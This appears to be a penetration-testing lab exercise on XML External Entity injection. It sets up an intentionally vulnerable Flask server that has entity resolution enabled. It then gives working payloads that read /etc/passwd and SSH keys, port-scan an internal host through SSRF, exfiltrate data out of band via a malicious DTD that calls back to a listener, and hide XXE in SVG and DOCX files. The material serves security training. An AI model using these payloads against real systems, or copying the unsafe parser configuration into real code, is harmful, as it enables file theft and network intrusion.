# 🔬 Lab Exercise 7: XXE (XML External Entity) Injection

> **Challenge:** Exploit XML parsers to read files or perform SSRF
> **Where:** Custom vulnerable Flask server on Kali + Juice Shop
> **Time:** ~50-60 minutes

---

## Exercise 7A: Set Up a Vulnerable XML Server

**Task:** Create a simple vulnerable Python Flask app on Kali that parses XML without protection.

```bash
# Step 1: Install Flask and lxml
pip3 install flask lxml

# Step 2: Create the vulnerable XML server
cat > /tmp/xxe_server.py << 'PYEOF'
from flask import Flask, request, render_template_string
from lxml import etree

app = Flask(__name__)

HOME_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Product Feedback</title></head>
<body>
  <h1>Submit Product Feedback (XML)</h1>
  <form action="/submit" method="POST">
    <textarea name="xml_data" rows="12" cols="60" placeholder="Enter XML feedback...">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;feedback&gt;
  &lt;name&gt;John&lt;/name&gt;
  &lt;email&gt;john@example.com&lt;/email&gt;
  &lt;comment&gt;Great product!&lt;/comment&gt;
&lt;/feedback&gt;</textarea>
    <br><br>
    <button type="submit">Submit Feedback</button>
  </form>
  <hr>
  <h3>API Endpoint</h3>
  <p>POST /api/feedback with Content-Type: application/xml</p>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HOME_PAGE)

@app.route('/submit', methods=['POST'])
def submit_form():
    xml_data = request.form.get('xml_data', '')
    try:
        # VULNERABLE: Parses XML with external entities enabled!
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
        root = etree.fromstring(xml_data.encode(), parser)
        name = root.findtext('name', 'N/A')
        email = root.findtext('email', 'N/A')
        comment = root.findtext('comment', 'N/A')
        return f"<h2>Feedback Received!</h2><p>Name: {name}</p><p>Email: {email}</p><p>Comment: {comment}</p><br><a href='/'>Back</a>"
    except Exception as e:
        return f"<h2>Error parsing XML:</h2><pre>{str(e)}</pre><br><a href='/'>Back</a>"

@app.route('/api/feedback', methods=['POST'])
def api_feedback():
    xml_data = request.data
    try:
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
        root = etree.fromstring(xml_data, parser)
        name = root.findtext('name', 'N/A')
        email = root.findtext('email', 'N/A')
        comment = root.findtext('comment', 'N/A')
        return f"Name: {name}\nEmail: {email}\nComment: {comment}"
    except Exception as e:
        return f"Error: {str(e)}", 400

if __name__ == '__main__':
    print("[*] Vulnerable XXE server running on http://0.0.0.0:5000")
    print("[!] WARNING: This server is intentionally vulnerable!")
    app.run(host='0.0.0.0', port=5000, debug=True)
PYEOF

# Step 3: Start the server
python3 /tmp/xxe_server.py &

# Step 4: Verify it's running
curl -s http://localhost:5000 | head -5
# ✅ EXPECTED: HTML page loads with "Product Feedback" title

# Access in Firefox: http://localhost:5000
```

---

## Exercise 7B: Basic XXE — Read /etc/passwd

**Target:** Vulnerable Flask server at `http://localhost:5000`

```bash
# Step 1: Send normal XML feedback first
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<feedback>
  <name>Test User</name>
  <email>test@test.com</email>
  <comment>Normal feedback</comment>
</feedback>'
# ✅ EXPECTED: Name: Test User / Email: test@test.com / Comment: Normal feedback

# Step 2: Inject XXE to read /etc/passwd
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feedback>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <comment>XXE test</comment>
</feedback>'
# ✅ EXPECTED: Name field shows contents of /etc/passwd!
# 📝 Copy the output — you can see all system users

# Step 3: Read other sensitive files
# /etc/hostname
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<feedback>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <comment>reading hostname</comment>
</feedback>'

# /etc/hosts
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<feedback>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <comment>reading hosts</comment>
</feedback>'

# 📝 What files did you successfully read?
```

---

## Exercise 7C: XXE via Browser Form

**Target:** Flask server web form at `http://localhost:5000`

```
Step 1: Open http://localhost:5000 in Firefox

Step 2: Replace the default XML in the textarea with:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <feedback>
    <name>&xxe;</name>
    <email>hacker@evil.com</email>
    <comment>XXE via form</comment>
  </feedback>

Step 3: Click "Submit Feedback"
  ✅ EXPECTED: The "Name" field shows the contents of /etc/passwd!

Step 4: Try reading SSH keys
  Replace the entity with:
    <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
  📝 Could you read the SSH private key? ______________
  📝 Why might this fail? (permissions)

Step 5: Try reading application source code
  Replace the entity with:
    <!ENTITY xxe SYSTEM "file:///tmp/xxe_server.py">
  ✅ EXPECTED: You can see the vulnerable server's source code!
  📝 This helps attackers understand the application internals
```

---

## Exercise 7D: XXE for SSRF — Internal Port Scanning

```bash
# XXE can also make HTTP requests (SSRF via XXE)

# Step 1: Make the server request an internal URL
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.56.20:80/">
]>
<feedback>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <comment>SSRF via XXE</comment>
</feedback>'
# 📝 Does the response include content from Metasploitable's web server?

# Step 2: Try accessing Metasploitable Tomcat
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.56.20:8180/">
]>
<feedback>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <comment>accessing tomcat</comment>
</feedback>'
# 📝 Can you see Tomcat's page content?

# Step 3: Port scan via XXE (observe response differences)
for port in 21 22 80 3306 5432 8180; do
  echo "--- Testing port $port ---"
  curl -s -X POST http://localhost:5000/api/feedback \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"http://192.168.56.20:$port/\">
]>
<feedback>
  <name>&xxe;</name>
  <email>test</email>
  <comment>port $port</comment>
</feedback>" --max-time 5 2>/dev/null
  echo ""
done
# 📝 Which ports returned data vs timed out?
```

---

## Exercise 7E: Blind XXE — Out-of-Band Data Exfiltration

```bash
# When the server processes XXE but doesn't show the output (blind),
# you exfiltrate data out-of-band using HTTP requests

# Step 1: Start an HTTP listener on Kali
python3 -m http.server 8888 &

# Step 2: Create a malicious external DTD file
cat > /tmp/evil.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://192.168.56.10:8888/?data=%file;'>">
%eval;
DTDEOF

# Step 3: Serve the DTD file (it's already in /tmp/ served by our Python server)
# The HTTP server on port 8888 serves files from wherever you started it

# Step 4: Send the blind XXE payload
curl -X POST http://localhost:5000/api/feedback \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://192.168.56.10:8888/evil.dtd">
  %xxe;
]>
<feedback>
  <name>&exfil;</name>
  <email>test@test.com</email>
  <comment>blind xxe</comment>
</feedback>'

# Step 5: Check your HTTP listener output
# ✅ EXPECTED: You see a request like:
#   GET /?data=kali HTTP/1.1
# 📝 The data (hostname) was exfiltrated via HTTP!

# Step 6: Clean up
kill %2  # Stop the HTTP server
```

---

## Exercise 7F: XXE in Different Contexts

**Task:** Understand where XXE can occur beyond simple XML inputs.

```bash
# Context 1: SVG file upload (SVGs are XML!)
cat > /tmp/xxe.svg << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="50">&xxe;</text>
</svg>
SVGEOF
# 📝 If a server processes SVG uploads, this could trigger XXE

# Context 2: DOCX files contain XML
# A .docx is just a ZIP with XML files inside
mkdir -p /tmp/docx_test
cd /tmp/docx_test
echo '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>' > document.xml
# 📝 In real attacks, you'd modify word/document.xml inside a .docx

# Context 3: JSON to XML conversion
# Some APIs accept both JSON and XML
# If you change Content-Type from application/json to application/xml
# and send XML instead of JSON, you might trigger XXE!

# Example: Original JSON request
# Content-Type: application/json
# {"name": "test"}

# Changed to XML:
# Content-Type: application/xml
# <?xml version="1.0"?>
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root><name>&xxe;</name></root>

# 📝 Summary — where to look for XXE:
# ✅ Any API endpoint accepting XML
# ✅ File uploads: SVG, DOCX, XLSX, XML, SOAP
# ✅ APIs that accept multiple content types
# ✅ RSS/Atom feed parsers
# ✅ SAML authentication endpoints
```

```bash
# Clean up: Stop the vulnerable server
kill $(pgrep -f xxe_server.py)
```

---

## ✅ Completion Checklist

- [ ] Set up a vulnerable XXE server on Kali with Flask (7A)
- [ ] Read /etc/passwd via basic XXE injection (7B)
- [ ] Performed XXE via browser form — read server source code (7C)
- [ ] Used XXE for SSRF — internal port scanning (7D)
- [ ] Demonstrated blind XXE with out-of-band HTTP exfiltration (7E)
- [ ] Understood XXE in different contexts: SVG, DOCX, JSON→XML (7F)

---

**Next:** [Challenge 27: Directory Traversal →](./08_lab_directory_traversal.md)
